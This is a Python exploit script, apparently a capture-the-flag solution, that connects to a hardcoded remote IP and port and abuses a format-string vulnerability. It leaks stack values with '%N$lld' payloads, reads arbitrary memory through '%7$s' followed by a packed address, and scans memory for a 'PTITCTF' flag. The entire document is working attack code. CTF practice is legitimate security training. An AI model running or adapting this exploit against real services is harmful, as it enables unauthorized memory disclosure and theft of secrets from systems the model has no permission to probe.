#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.05)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)

s=newconn()
arg2=leak_lld(s,2)  # stack/buffer
top=arg2 & ~0xfff
print("arg2=",hex(arg2),"page=",hex(top))
found=[]
cur=top
for i in range(800):
    r=readmem(s,cur)
    if b'PTITCTF' in r or b'{' in r:
        print("MARK",hex(cur),repr(r[:300])); found.append((cur,r))
    strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
    if b'PTITCTF' in r:
        cur+=1
    else:
        cur+=max(len(strb),1)
    if cur < top-0x100000:
        break
    if i%200==0: print(" ...",hex(cur))
print("done found:",len(found))
s.close()
